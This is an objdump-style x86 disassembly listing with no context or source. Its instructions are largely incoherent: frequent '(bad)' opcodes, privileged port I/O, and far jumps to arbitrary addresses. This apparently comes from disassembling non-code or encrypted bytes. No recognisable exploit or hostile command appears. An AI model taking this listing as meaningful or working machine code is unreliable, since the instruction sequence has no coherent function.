  41b576:	int3   
  41b577:	fmul   st,st(5)
  41b579:	icebp  
  41b57a:	shl    dh,cl
  41b57c:	cld    
  41b57d:	loope  0x41b538
  41b57f:	add    esp,ebp
  41b581:	fcmovb st,st(1)
  41b583:	fild   WORD PTR [edi]
  41b585:	fdivr  st,st(0)
  41b587:	push   es
  41b588:	fcmovne st,st(3)
  41b58a:	(bad)  
  41b58b:	repnz mov ebp,0xd7dddfd3
  41b591:	loope  0x41b564
  41b593:	(bad)  
  41b594:	test   dh,0xe8
  41b597:	vpminsw xmm5,xmm0,xmm0
  41b59b:	not    bh
  41b59d:	fcom   st(0)
  41b59f:	int3   
  41b5a0:	in     eax,dx
  41b5a1:	mov    esp,0xeb0bf9
  41b5a6:	(bad)  
  41b5a7:	cld    
  41b5a8:	loop   0x41b5a7
  41b5aa:	or     edi,ebx
  41b5ac:	icebp  
  41b5ad:	mul    esp
  41b5af:	jmp    0x41b588
  41b5b1:	in     eax,0xce
  41b5b3:	(bad)  
  41b5b4:	loopne 0x41b5b1
  41b5b6:	out    0xfa,al
  41b5b8:	mov    eax,0xe8ceb9dd
  41b5bd:	mov    dh,0xef
  41b5bf:	add    eax,0xc7dfd3
  41b5c4:	add    DWORD PTR [ebx],ecx
  41b5c6:	out    0x8,al
  41b5c8:	(bad)  
  41b5c9:	fucom  st(7)
  41b5cb:	(bad)  
  41b5cd:	jmp    0xc2f382af
  41b5d2:	hlt    
  41b5d3:	shl    cl,1
  41b5d5:	mov    bh,0xb0
  41b5d7:	fsub   st,st(5)
  41b5d9:	(bad)  
  41b5da:	shr    eax,cl
  41b5dc:	mov    esp,0xd9f2e7ed
  41b5e1:	rol    ebp,1
  41b5e3:	or     ecx,esi
  41b5e5:	add    eax,0xdceeebc0
  41b5ea:	(bad)  
  41b5ec:	in     eax,dx
  41b5ed:	loop   0x41b5d7
  41b5ef:	in     eax,0xb6
  41b5f1:	shl    edx,0xf1
  41b5f4:	stc    
  41b5f5:	in     al,dx
  41b5f6:	(bad)
  41b5f9:	in     al,0xd1
  41b5fb:	shr    eax,1
  41b5fd:	mov    esi,0xd5d7c1ed
  41b602:	(bad)  
  41b603:	lock std 
  41b605:	test   bh,0xfa
  41b608:	add    ah,cl
  41b60a:	les    ecx,FWORD PTR [ebx]
  41b60c:	test   eax,0xd7f7e0e1
  41b611:	rol    esi,0xf3
  41b614:	enter  0xd7b8,0xc6
  41b618:	mov    edx,0xdcd0bedb
  41b61d:	cld    
  41b61e:	(bad)  
  41b61f:	mov    esi,0xd8ebf0db
  41b624:	ret    0xfd03
  41b627:	sti    
  41b628:	loopne 0x41b602
  41b62a:	add    dl,BYTE PTR [edx]
  41b62c:	leave  
  41b62d:	ret    
  41b62e:	vpsllw xmm1,xmm3,xmm3
  41b632:	mov    ch,0xc1
  41b634:	cli    
  41b635:	out    0xf0,eax
  41b637:	call   0x3fc70f2
  41b63c:	(bad)  
  41b63d:	repnz fstp st(0)
  41b640:	fdivr  st(1),st
  41b642:	lock shl ch,0xfe
  41b646:	aad    0x2
  41b648:	sti    
  41b649:	repz or edi,ebp
  41b64c:	retf   0xf2f3
  41b64f:	loop   0x41b611
  41b651:	(bad)  
  41b652:	jmp    0x41b642
  41b654:	les    ebp,FWORD PTR [esi-0x42323533]
  41b65a:	loop   0x41b65e
  41b65c:	loopne 0x41b645
  41b65e:	mov    esp,0xf3e1e5be
  41b663:	jmp    0x1ca:0xc8d9e2c2
  41b66a:	in     eax,0xcb
  41b66c:	call   0xd7397663
  41b671:	mov    dl,0xc9
  41b673:	mov    bh,0xca
  41b675:	mov    bh,0xee
  41b677:	jmp    0xfd207050
  41b67c:	jmp    0xc4139d81
  41b681:	(bad)  
  41b682:	cld    
  41b683:	loop   0x41b67a
  41b685:	std    
  41b686:	out    dx,al
  41b687:	leave  
  41b688:	aad    0xc9
  41b68a:	repz or eax,0xc5c8b1a7
  41b690:	out    0xeb,eax
  41b692:	lods   eax,DWORD PTR ds:[esi]
  41b693:	mul    esi
  41b695:	mov    al,0xdf
  41b697:	retf   0xdcfd
  41b69a:	mov    ah,0xdd
  41b69c:	loop   0x41b69c
  41b69e:	out    0xfe,eax
  41b6a0:	aad    0xff
  41b6a2:	(bad)  
  41b6a3:	idiv   esp
  41b6a5:	loopne 0x41b69e
  41b6a7:	add    eax,edi
  41b6a9:	fsubr  st(0),st
  41b6ab:	jecxz  0x41b693
  41b6ad:	out    0xe6,al
  41b6af:	scas   al,BYTE PTR es:[edi]
  41b6b0:	shl    BYTE PTR [eax-0x4730123e],1
  41b6b6:	iret   
  41b6b7:	in     al,dx
  41b6b8:	clc    
  41b6b9:	sar    BYTE PTR [ecx+0xd1eec3],cl
  41b6bf:	mov    ebp,0xe104c1d9
  41b6c4:	sar    ebp,1
  41b6c6:	add    dl,ch
  41b6c8:	add    al,0x3
  41b6ca:	fmulp  st(5),st
  41b6cc:	in     al,0xdd
  41b6ce:	jmp    0xd31e9890
  41b6d3:	leave  
  41b6d4:	out    0xdf,eax
  41b6d6:	test   cl,0xf7
  41b6d9:	(bad)  
  41b6da:	fidivr WORD PTR [eax-0x2b091206]
  41b6e0:	cli    
  41b6e1:	xlat   BYTE PTR ds:[ebx]
  41b6e2:	fcomip st,st(7)
  41b6e4:	in     al,0xd9
  41b6e6:	enter  0xdafc,0x2
  41b6ea:	int3   
  41b6eb:	loopne 0x41b6b2
  41b6ed:	scas   al,BYTE PTR es:[edi]
  41b6ee:	enter  0xe3ce,0xb4
  41b6f2:	loope  0x41b6e6
  41b6f4:	in     al,dx
  41b6f5:	jmp    0xd1ed:0xd5d6f4e5
  41b6fc:	(bad)  
  41b6fe:	out    dx,al
  41b6ff:	sar    BYTE PTR [ebx+0xe7e6db],1
  41b705:	in     al,0xcb
  41b707:	cld    
  41b708:	add    eax,esi
  41b70a:	lds    eax,FWORD PTR [esi]
  41b70c:	scas   eax,DWORD PTR es:[edi]
  41b70d:	rol    ebx,cl
  41b70f:	cmc    
  41b710:	jmp    0xbafb:0xe5ece9bc
  41b717:	sar    eax,1
  41b719:	(bad)  
  41b71a:	cmc    
  41b71b:	cmc    
  41b71c:	inc    DWORD PTR [ecx]
  41b71e:	loope  0x41b726
  41b720:	fcmovbe st,st(0)
  41b722:	sti    
  41b723:	bnd jmp 0x82f942e
  41b729:	retf   0xe4fd
  41b72c:	shl    eax,0xc2
  41b72f:	xlat   BYTE PTR ds:[ebx]
  41b730:	jecxz  0x41b704
  41b732:	jecxz  0x41b6fa
  41b734:	sar    eax,cl
  41b736:	mov    edi,0xdaf7ddda
  41b73b:	loope  0x41b6fa
  41b73d:	add    bl,ah
  41b73f:	loop   0x41b712
  41b741:	ret    
  41b742:	(bad)  
  41b743:	add    ebp,esp
  41b745:	aad    0xc6
  41b747:	clc    
  41b748:	stc    
  41b749:	loope  0x41b724
  41b74b:	into   
  41b74c:	ffreep st(0)
  41b74e:	test   al,0xc1
  41b750:	rcr    ah,0xf2
  41b753:	loope  0x41b722
  41b755:	sti    
  41b756:	fxch   st(5)
  41b758:	mov    bl,0xfa
  41b75a:	mov    ebp,0xf1e0f6f4
  41b75f:	(bad)  
  41b760:	(bad)  
  41b762:	add    al,0xf6
  41b764:	add    eax,edi
  41b766:	(bad)  
  41b768:	fsub   st,st(6)
  41b76a:	enter  0xc013,0xcb
  41b76e:	loop   0x41b734
  41b770:	hlt    
  41b771:	(bad)  
  41b772:	mov    dh,0xcc
  41b774:	jmp    0xca2ea348
  41b779:	jecxz  0x41b733
  41b77b:	mov    esp,0xbc03f8fb
  41b780:	shl    ecx,1
  41b782:	cli    
  41b783:	mov    eax,0xe9f4c90a
  41b788:	(bad)  
  41b789:	in     eax,dx
  41b78a:	clc    
  41b78b:	enter  0xdeeb,0xd2
  41b78f:	lds    esi,FWORD PTR [ebx-0x2744160d]
  41b795:	out    dx,eax
  41b796:	mov    edi,0xb4cfb3f4
  41b79b:	hlt    
  41b79c:	loop   0x41b791
  41b79e:	cli    
  41b79f:	in     al,dx
  41b7a0:	sti    
  41b7a1:	mov    ebp,0xf40202dc
  41b7a6:	jmp    0xeae7:0xffeff5ef
  41b7ad:	lods   al,BYTE PTR ds:[esi]
  41b7ae:	ret    
  41b7af:	repnz rcl ch,1
  41b7b2:	lods   al,BYTE PTR ds:[esi]
  41b7b3:	(bad)  
  41b7b4:	out    dx,eax
  41b7b5:	out    dx,al
  41b7b6:	cmc    
  41b7b7:	jmp    0xf40e979a
  41b7bc:	loop   0x41b7bf
  41b7be:	cli    
  41b7bf:	mov    esi,0xd900d8fa
  41b7c4:	fcmove st,st(3)
  41b7c6:	sti    
  41b7c7:	retf   0xd9e5
  41b7ca:	add    al,0xe
  41b7cc:	shr    BYTE PTR [eax-0x4c0d153d],cl
  41b7d2:	loop   0x41b796
  41b7d4:	lock mov bh,0xef
  41b7d7:	int3   
  41b7d8:	retf   0xd0f4
  41b7db:	sar    DWORD PTR [esp+edi*4-0xdff0a09],cl
  41b7e2:	fdiv   st(2),st
  41b7e4:	(bad)  
  41b7e5:	in     eax,0xcf
  41b7e7:	add    al,0xcb
  41b7e9:	in     eax,0xcf
  41b7eb:	call   0xad3076c8
  41b7f0:	loope  0x41b7d2
  41b7f2:	test   al,0xb6
  41b7f5:	repz (bad) 
  41b7f7:	cli    
  41b7f8:	mov    ah,0xee
  41b7fa:	cmc    
  41b7fb:	mov    ecx,0xcef2e7f4
  41b800:	std    
  41b801:	aam    0xbd
  41b803:	pop    es
  41b804:	push   es
  41b805:	retf   
  41b806:	push   es
  41b807:	fadd   DWORD PTR [ecx]
  41b809:	(bad)  
  41b80a:	call   edx
  41b80c:	fxch   st(3)
  41b80e:	(bad)  
  41b80f:	scas   al,BYTE PTR es:[edi]
  41b810:	hlt    
  41b811:	jecxz  0x41b7c3
  41b813:	ror    bl,cl
  41b815:	out    0xb6,al
  41b817:	sar    ebp,cl
  41b819:	int    0xeb
  41b81b:	mov    esp,0xd903f0f2
  41b820:	in     al,dx
  41b821:	(bad)  
  41b822:	icebp  
  41b823:	push   es
  41b824:	retf   
  41b825:	or     BYTE PTR [eax],cl
  41b827:	in     al,0xe
  41b829:	(bad)  
  41b82a:	fsubrp st(2),st
  41b82c:	rcr    al,1
  41b82e:	rcr    esp,cl
  41b830:	cmc    
  41b831:	lods   al,BYTE PTR ds:[esi]
  41b832:	mov    dl,0xec
  41b834:	aam    0xb2
  41b836:	mov    dh,0xd2
  41b838:	mov    edx,0xeec3fbd4
  41b83d:	cmc    
  41b83e:	sti    
  41b83f:	fstp   TBYTE PTR [ebp-0x83cfb42]
  41b845:	hlt    
  41b846:	out    dx,al
  41b847:	or     esi,edi
  41b849:	push   cs
  41b84a:	shr    esi,0xa9
  41b84d:	loop   0x41b80b
  41b84f:	test   esp,0xede9ccac
  41b855:	mov    ah,0xb9
  41b857:	mov    ecx,0x3ecd4d6
  41b85c:	shr    edi,cl
  41b85e:	loopne 0x41b831
  41b860:	neg    ah
  41b862:	(bad)  
  41b864:	fld    DWORD PTR [edx]
  41b866:	leave  
  41b867:	jmp    0x41b850
  41b869:	out    0x8,eax
  41b86b:	fcmovu st,st(4)
  41b86d:	shr    ah,cl
  41b86f:	(bad)  
  41b870:	out    0xc7,al
  41b872:	(bad)  
  41b873:	loopne 0x41b867
  41b875:	xlat   BYTE PTR ds:[ebx]
  41b876:	(bad)  
  41b877:	leave  
  41b878:	in     al,0xe4
  41b87a:	lock stc 
  41b87c:	add    DWORD PTR [edi],eax
  41b87e:	fucomip st,st(4)
  41b880:	inc    ecx
  41b882:	fdiv   st,st(4)
  41b884:	(bad)  
  41b885:	out    dx,eax
  41b886:	std    
  41b887:	(bad)  
  41b888:	fcmove st,st(4)
  41b88a:	into   
  41b88b:	adc    dl,bl
  41b88d:	ret    0xc8d2
  41b890:	iret   
  41b891:	jmp    0x41b86e
  41b893:	sti    
  41b894:	loopne 0x41b860
  41b896:	shl    edx,cl
  41b898:	hlt    
  41b899:	leave  
  41b89a:	rol    bl,cl
  41b89c:	idiv   BYTE PTR [ebp-0x812192d]
  41b8a2:	repz jmp 0xee2:0xffc0e9d9
  41b8aa:	ror    DWORD PTR [edi],cl
  41b8ac:	mov    esp,0xbdd2c6b3
  41b8b1:	loop   0x41b877
  41b8b3:	stc    
  41b8b4:	shr    edx,0xc4
  41b8b7:	fsubp  st(0),st
  41b8b9:	enter  0xccd9,0xfa
  41b8bd:	rcr    edx,cl
  41b8bf:	loop   0x41b884
  41b8c1:	aad    0xfe
  41b8c3:	(bad)  
  41b8c5:	or     bh,cl
  41b8c7:	sti    
  41b8c8:	jecxz  0x41b88e
  41b8ca:	or     bh,dh
  41b8cc:	mov    eax,0xadc0ccbe
  41b8d1:	rol    ecx,cl
  41b8d3:	hlt    
  41b8d4:	in     eax,dx
  41b8d5:	fdiv   st,st(0)
  41b8d7:	repnz std 
  41b8d9:	fucomp st(2)
  41b8db:	fcmovnu st,st(4)
  41b8dd:	enter  0xf8e2,0x1
  41b8e1:	add    eax,0xf609e4e5
  41b8e6:	xlat   BYTE PTR ds:[ebx]
  41b8e7:	cmc    
  41b8e8:	or     al,0xc5
  41b8ea:	out    dx,al
  41b8eb:	iret   
  41b8ec:	in     eax,dx
  41b8ed:	stos   BYTE PTR es:[edi],al
  41b8ee:	fucomip st,st(0)
  41b8f0:	mov    dl,0xcb
  41b8f2:	ret    
  41b8f3:	mov    dl,0xb0
  41b8f5:	rcl    al,0xb6
  41b8f8:	out    dx,al
  41b8f9:	shr    al,cl
  41b8fb:	out    dx,eax
  41b8fc:	rol    ecx,0xec
  41b8ff:	add    edx,ebx
  41b901:	stc    
  41b902:	xbegin 0x409aef8
  41b908:	cmc    
  41b909:	leave  
  41b90a:	into   
  41b90b:	adc    DWORD PTR [esi-0x29221735],edi
  41b911:	int3   
  41b912:	retf   0xb6b1
  41b915:	fldlg2 
  41b917:	repnz in al,dx
  41b919:	cli    
  41b91a:	call   0x5b3f4
  41b91f:	aam    0xbd
  41b921:	imul   ebx
  41b923:	loopne 0x41b905
  41b925:	sti    
  41b926:	in     eax,0xc0
  41b928:	(bad)  
  41b929:	fmul   st,st(2)
  41b92b:	or     eax,0xb6f1a9b2
  41b930:	in     eax,dx
  41b931:	(bad)  
  41b932:	mov    al,0xe6
  41b934:	in     eax,0xd6
  41b936:	fdivrp st(2),st
  41b938:	mov    ah,0xf8
  41b93a:	aad    0xe2
  41b93c:	(bad)  
  41b93e:	(bad)  
  41b940:	fiadd  DWORD PTR [edx+eax*1]
  41b943:	jmp    0xf2cc42c
  41b948:	add    eax,0xb2120906
  41b94d:	mov    cl,0xd2
  41b94f:	(bad)  
  41b950:	scas   al,BYTE PTR es:[edi]
  41b951:	repz mov dl,0xec
  41b954:	in     al,0xc9
  41b956:	mov    ah,0xc5
  41b958:	in     al,0xfc
  41b95a:	ret    
  41b95b:	mov    edx,0xc3dbb9d3
  41b960:	cli    
  41b961:	(bad)  
  41b963:	ret    0x7f1
  41b966:	(bad)  
  41b968:	or     eax,0xf002ebfd
  41b96d:	mov    dl,0xe2
  41b96f:	mov    al,0xac
  41b971:	(bad)  
  41b972:	repz fcmovbe st,st(1)
  41b975:	shl    esi,cl
  41b977:	jmp    0x7fb:0xd0f3cabe
  41b97e:	fild   DWORD PTR [ecx]
  41b980:	in     al,dx
  41b981:	rol    DWORD PTR [edi],cl
  41b983:	out    0xa,eax
  41b985:	fdivr  st,st(6)
  41b987:	iret   
  41b988:	pop    es
  41b989:	iret   
  41b98a:	loope  0x41b999
  41b98c:	fsubr  st,st(3)
  41b98e:	(bad)  
  41b98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b990:	scas   eax,DWORD PTR es:[edi]
  41b991:	call   0xfa2b957d
  41b996:	out    dx,eax
  41b997:	(bad)  
  41b998:	repz mov ebp,0xe3d8e2b8
  41b99e:	mov    ch,0xd9
  41b9a0:	cmc    
  41b9a1:	xlat   BYTE PTR ds:[ebx]
  41b9a2:	(bad)  
  41b9a3:	aad    0xf1
  41b9a5:	or     edx,esi
  41b9a7:	hlt    
  41b9a8:	call   0xcf2ba579
  41b9ad:	(bad)  
  41b9ae:	(bad)  
  41b9af:	mov    cl,0xbd
  41b9b1:	mov    bh,0xc8
  41b9b3:	fldcw  WORD PTR [edi-0x1a344810]
  41b9b9:	int3   
  41b9ba:	mov    ah,0xff
  41b9bc:	ror    ah,1
  41b9be:	repnz fprem1 
  41b9c1:	rol    DWORD PTR [edi],1
  41b9c3:	aad    0x6
  41b9c5:	push   es
  41b9c6:	enter  0xe03,0x7
  41b9ca:	lds    ecx,FWORD PTR ds:0xe3f0d2f1
  41b9d0:	(bad)  
  41b9d1:	in     eax,0xcb
  41b9d3:	enter  0xb7bb,0xeb
  41b9d7:	rcr    ah,1
  41b9d9:	call   0xf517a99b
  41b9de:	rol    ebx,cl
  41b9e0:	cli    
  41b9e1:	add    eax,0xc1bfcac5
  41b9e6:	in     al,0xbc
  41b9e8:	fxch   st(7)
  41b9ea:	(bad)  
  41b9eb:	(bad)  
  41b9ec:	(bad)  
  41b9ee:	test   al,0xcb
  41b9f0:	mov    dl,0xd0
  41b9f2:	neg    cl
  41b9f4:	clc    
  41b9f5:	mov    al,0xce
  41b9f7:	mov    al,0xde
  41b9f9:	shl    dl,1
  41b9fb:	idiv   ebx
  41b9fd:	(bad)  
  41b9ff:	rcr    ebx,0x1
  41ba02:	shr    cl,0xe6
  41ba05:	(bad)
  41ba08:	or     BYTE PTR ds:0xe6aed3f2,al
  41ba0e:	out    0xac,al
  41ba10:	scas   eax,DWORD PTR es:[edi]
  41ba11:	lock aam 0xca
  41ba14:	cmc    
  41ba15:	in     eax,dx
  41ba16:	out    dx,eax
  41ba17:	mov    ch,0xd4
  41ba19:	mov    edx,0xdfc2d5f3
  41ba1e:	cli    
  41ba1f:	clc    
  41ba20:	mov    edi,0xe0d202fc
  41ba25:	jecxz  0x41ba29
  41ba27:	(bad)  
  41ba28:	cli    
  41ba29:	push   cs
  41ba2a:	or     edi,esi
  41ba2c:	fcomp  st(4)
  41ba2e:	mov    al,0xc9
  41ba30:	int3   
  41ba31:	out    0xf5,eax
  41ba33:	rcr    edx,0xf4
  41ba36:	in     al,0xcc
  41ba38:	jmp    0x41b9f6
  41ba3a:	mov    edx,0xd4d4c8b9
  41ba3f:	mov    esp,0xfac30705
  41ba44:	add    bh,dh
  41ba46:	fcmovb st,st(7)
  41ba48:	out    0xf,al
  41ba4a:	loop   0x41ba2c
  41ba4c:	mov    cl,0xce
  41ba4e:	out    0xd7,al
  41ba50:	icebp  
  41ba51:	int3   
  41ba52:	lods   al,BYTE PTR ds:[esi]
  41ba53:	cli    
  41ba54:	retf   0xf6bb
  41ba57:	aad    0xf1
  41ba59:	cld    
  41ba5a:	ror    ecx,1
  41ba5c:	mov    esi,0xc3d700d0
  41ba61:	cli    
  41ba62:	sti    
  41ba63:	(bad)  
  41ba64:	(bad)  
  41ba65:	(bad)  
  41ba66:	fmul   QWORD PTR [eax]
  41ba68:	add    eax,0xafe01307
  41ba6d:	out    dx,al
  41ba6e:	repnz ffree st(5)
  41ba71:	(bad)  
  41ba72:	repz (bad) 
  41ba74:	rcl    cl,cl
  41ba76:	ror    ebp,cl
  41ba78:	(bad)  
  41ba7a:	into   
  41ba7b:	(bad)  
  41ba7d:	cli    
  41ba7e:	fnstsw WORD PTR [edi+eax*1-0x18351b3a]
  41ba85:	call   0xe90a816f
  41ba8a:	or     eax,0xe8e0e9e9
  41ba8f:	mov    cl,0xad
  41ba91:	out    dx,eax
  41ba92:	not    cl
  41ba94:	into   
  41ba95:	mov    bh,0xd5
  41ba97:	sar    DWORD PTR [ebp-0xe310e2e],1
  41ba9d:	out    dx,al
  41ba9e:	cld    
  41ba9f:	mov    esi,0xbc2e2d5
  41baa5:	mul    ecx
  41baa7:	or     cl,bh
  41baa9:	leave  
  41baaa:	add    eax,0xe8e9e6de
  41baaf:	retf   
  41bab0:	cmc    
  41bab1:	shr    esp,1
  41bab3:	iret   
  41bab4:	repnz clc 
  41bab6:	jmp    0x41ba84
  41bab8:	retf   0xeaf8
  41babb:	loop   0x41ba7f
  41babd:	out    0xdc,eax
  41babf:	stc    
  41bac0:	pop    es
  41bac1:	(bad)  
  41bac3:	shl    ch,1
  41bac5:	fdivr  st,st(0)
  41bac7:	sti    
  41bac8:	loop   0x41ba93
  41baca:	repnz leave 
  41bacc:	ret    
  41bacd:	(bad)  
  41bace:	out    dx,eax
  41bacf:	fmul   st(3),st
  41bad1:	shl    eax,1
  41bad3:	out    0xc5,al
  41bad5:	out    0xb6,al
  41bad7:	cmc    
  41bad8:	mov    eax,0xdbc8d0c8
  41badd:	int3   
  41bade:	fsubr  st(7),st
  41bae0:	push   es
  41bae1:	loope  0x41baa4
  41bae3:	add    al,0xdd
  41bae5:	test   ah,0xc4
  41bae8:	(bad)  
  41baea:	ror    DWORD PTR [edx],0xdc
  41baed:	jmp    0xee26a1ce
  41baf2:	imul   ebp
  41baf4:	in     eax,dx
  41baf5:	lock hlt 
  41baf7:	sti    
  41baf8:	mov    ch,0xb9
  41bafa:	in     al,dx
  41bafb:	int3   
  41bafc:	icebp  
  41bafd:	fdivr  DWORD PTR [ecx-0x23d0d3d]
  41bb03:	fsubrp st(4),st
  41bb05:	(bad)  
  41bb06:	out    0xdd,eax
  41bb08:	hlt    
  41bb09:	jecxz  0x41bb15
  41bb0b:	call   0xe1197bb7
  41bb10:	loopne 0x41bae9
  41bb12:	rol    dh,cl
  41bb14:	out    0xbb,al
  41bb16:	jmp    0x41bafc
  41bb18:	(bad)  
  41bb19:	mov    esi,0xd6e9d5f7
  41bb1e:	iret   
  41bb1f:	in     eax,0xe5
  41bb21:	icebp  
  41bb22:	lock or ebp,edi
  41bb25:	fucompp 
  41bb27:	fucomp st(6)
  41bb29:	int    0xe5
  41bb2b:	retf   
  41bb2c:	stos   BYTE PTR es:[edi],al
  41bb2d:	mov    eax,0xaaefdec0
  41bb32:	ror    edx,1
  41bb34:	call   0xca3fa810
  41bb39:	mov    edi,0xb6bdffdf
  41bb3e:	aam    0xdd
  41bb40:	std    
  41bb41:	ret    0xf6fc
  41bb44:	loopne 0x41bb42
  41bb46:	aad    0xea
  41bb48:	stc    
  41bb49:	enter  0x3d3,0xaf
  41bb4d:	(bad)  
  41bb4e:	loopne 0x41bb30
  41bb50:	fmul   st(3),st
  41bb52:	retf   0xf6ec
  41bb55:	fbstp  TBYTE PTR [esi-0x4e300a01]
  41bb5b:	fcmovnb st,st(2)
  41bb5d:	loopne 0x41bb1f
  41bb5f:	ret    0xe7f0
  41bb62:	(bad)  
  41bb63:	out    0xfc,eax
  41bb65:	fild   WORD PTR [edx]
  41bb67:	out    0xf5,eax
  41bb69:	in     eax,0xea
  41bb6b:	(bad)  
  41bb6c:	shr    BYTE PTR [edi-0x51343e44],1
  41bb72:	mov    dh,0xd6
  41bb74:	mov    ah,0xeb
  41bb76:	repz rcr bh,cl
  41bb79:	cmc    
  41bb7a:	xlat   BYTE PTR ds:[ebx]
  41bb7b:	(bad)  
  41bb7c:	into   
  41bb7d:	sar    edx,1
  41bb7f:	(bad)  
  41bb80:	in     eax,0xd7
  41bb82:	in     al,0xd9
  41bb84:	rol    esi,0x6
  41bb87:	aam    0xe3
  41bb89:	add    al,0xc9
  41bb8b:	leave  
  41bb8c:	jecxz  0x41bb6c
  41bb8e:	enter  0xbddc,0xd2
  41bb92:	shl    BYTE PTR [ebp-0x60c442f],0xd2
  41bb99:	cmc    
  41bb9a:	aad    0xfc
  41bb9c:	in     al,dx
  41bb9d:	aam    0xcd
  41bb9f:	pop    es
  41bba0:	sar    dl,1
  41bba2:	mov    ecx,0xfa0fd0e0
  41bba7:	ftst   
  41bba9:	in     eax,0xdc
  41bbab:	clc    
  41bbac:	mov    cl,0xe9
  41bbae:	mov    esi,0xb4e0afae
  41bbb3:	iret   
  41bbb4:	repnz fcmovnbe st,st(5)
  41bbb7:	call   0xf53ea78b
  41bbbc:	cld    
  41bbbd:	into   
  41bbbe:	aam    0xb8
  41bbc0:	rcr    esp,1
  41bbc2:	add    bl,ah
  41bbc4:	loope  0x41bba6
  41bbc6:	add    bl,dh
  41bbc8:	(bad)  
  41bbc9:	fucomi st,st(3)
  41bbcb:	out    0xa8,al
  41bbcd:	loopne 0x41bba0
  41bbcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbd0:	stos   DWORD PTR es:[edi],eax
  41bbd1:	ret    0xefd3
  41bbd4:	(bad)  
  41bbd5:	mov    ebx,0xced7acff
  41bbda:	dec    cl
  41bbdc:	ret    
  41bbdd:	clc    
  41bbde:	fdivr  DWORD PTR [ecx+eax*8+0x7eaf50b]
  41bbe5:	add    eax,0xc6070b
  41bbea:	ror    ecx,0xaa
  41bbed:	fdivr  DWORD PTR [ebp-0x242a303d]
  41bbf3:	mov    edx,0xcbf7e0b6
  41bbf8:	mov    bl,0xea
  41bbfa:	fcmovnb st,st(2)
  41bbfc:	add    dl,dl
  41bbfe:	test   esp,0xa04fbf2
  41bc04:	hlt    
  41bc05:	out    dx,eax
  41bc06:	out    0xfa,eax
  41bc08:	std    
  41bc09:	push   es
  41bc0a:	or     al,0xf3
  41bc0c:	test   al,0xb8
  41bc0e:	shl    dh,0xe9
  41bc11:	out    dx,al
  41bc12:	in     eax,dx
  41bc13:	in     eax,dx
  41bc14:	iret   
  41bc15:	ror    ch,0xf6
  41bc18:	into   
  41bc19:	sar    BYTE PTR [ecx-0x2e0b4504],1
  41bc1f:	loopne 0x41bc00
  41bc21:	add    al,0x2
  41bc23:	test   BYTE PTR [edx],0xdc
  41bc26:	out    dx,eax
  41bc27:	fcmove st,st(5)
  41bc29:	in     eax,0x7
  41bc2b:	pop    es
  41bc2c:	loop   0x41bbe6
  41bc2e:	loope  0x41bc15
  41bc30:	repz loop 0x41bc02
  41bc33:	cmc    
  41bc34:	rol    esp,1
  41bc36:	mov    ah,0xcd
  41bc38:	(bad)  
  41bc3a:	mov    ebp,0xd4cdbfd5
  41bc3f:	in     eax,0x6
  41bc41:	push   es
  41bc42:	sar    dh,1
  41bc44:	jmp    0xe7f4:0xe3dffce6
  41bc4b:	retf   
  41bc4c:	into   
  41bc4d:	stos   BYTE PTR es:[edi],al
  41bc4e:	icebp  
  41bc4f:	ret    
  41bc50:	rcl    edx,0xf5
  41bc53:	mov    ebx,0xd6b5b6d5
  41bc58:	retf   
  41bc59:	retf   
  41bc5a:	lock loope 0x41bc30
  41bc5d:	repz fdivrp st(4),st
  41bc60:	aad    0xdf
  41bc62:	fyl2x  
  41bc64:	or     al,dl
  41bc66:	in     eax,0xff
  41bc68:	push   cs
  41bc69:	or     al,0xfa
  41bc6b:	fucomp st(6)
  41bc6d:	ret    
  41bc6e:	out    dx,eax
  41bc6f:	div    BYTE PTR [esi-0x392f5225]
  41bc75:	in     al,0xee
  41bc77:	in     al,dx
  41bc78:	jmp    0x41bc51
  41bc7a:	fsub   st(0),st
  41bc7c:	lock in al,dx
  41bc7e:	hlt    
  41bc7f:	hlt    
  41bc80:	aam    0xc1
  41bc82:	fstp   st(2)
  41bc84:	sar    DWORD PTR [esi-0x1a3624fb],1
  41bc8a:	in     eax,0xc
  41bc8c:	in     eax,0xca
  41bc8e:	out    0xc5,eax
  41bc90:	in     al,0xae
  41bc92:	out    dx,eax
  41bc93:	test   bh,0xcc
  41bc96:	aad    0xba
  41bc98:	cli    
  41bc99:	std    
  41bc9a:	jmp    0xc007:0x2b6e2fa
  41bca1:	in     al,dx
  41bca2:	in     eax,0xb
  41bca4:	(bad)  
  41bca5:	cmc    
  41bca6:	or     cl,bl
  41bca8:	fxtract 
  41bcaa:	or     bh,cl
  41bcac:	fidivr WORD PTR [edi-0x4b0a4d50]
  41bcb2:	jmp    0xf3ed:0xf6e4cde1
  41bcb9:	cli    
  41bcba:	push   edx
  41bcbc:	(bad)  
  41bcbd:	repz mov eax,0xf0d8e0cd
  41bcc3:	sar    BYTE PTR [edi+0x1ede9d6],0xd4
  41bcca:	out    0x3,eax
  41bccc:	(bad)  
  41bccd:	jecxz  0x41bc96
  41bccf:	loopne 0x41bcbb
  41bcd1:	mov    cl,0xad
  41bcd3:	leave  
  41bcd4:	clc    
  41bcd5:	mov    edx,0xd8b3fffb
  41bcda:	add    edi,DWORD PTR [edi-0x1e264a00]
  41bce0:	push   es
  41bce1:	pop    es
  41bce2:	rol    BYTE PTR [edx],cl
  41bce4:	add    bh,dh
  41bce6:	jmp    0x132d98bf
  41bceb:	adc    esp,eax
  41bced:	mov    esp,0xe1b6f7a5
  41bcf2:	in     al,dx
  41bcf3:	shl    al,1
  41bcf5:	repz mov ah,0xec
  41bcf8:	mov    eax,0xcfddd3e9
  41bcfd:	repnz mov ecx,0xc5e7e3dc
  41bd03:	jmp    0xdc08ccfe
  41bd08:	jmp    0xe510a30c
  41bd0d:	icebp  
  41bd0e:	mov    bl,0xf0
  41bd10:	aam    0xf0
  41bd12:	lock loopne 0x41bd05
  41bd15:	les    esi,FWORD PTR [ecx+edi*4-0x43053307]
  41bd1c:	repz clc 
  41bd1e:	aad    0xd9
  41bd20:	add    bh,dl
  41bd22:	loopne 0x41bcf5
  41bd24:	add    dh,bl
  41bd26:	mov    ebp,0xd8dd010e
  41bd2b:	fld    st(0)
  41bd2d:	test   eax,0xc5cac0ea
  41bd32:	enter  0xbbfb,0xef
  41bd36:	(bad)  
  41bd37:	(bad)  
  41bd39:	mov    edx,0xfdd9d2c3
  41bd3e:	rcr    ecx,1
  41bd40:	pop    es
  41bd41:	add    ebp,edx
  41bd43:	retf   
  41bd44:	hlt    
  41bd45:	jmp    0xfd09:0xe60106fa
  41bd4c:	into   
  41bd4d:	repz retf 
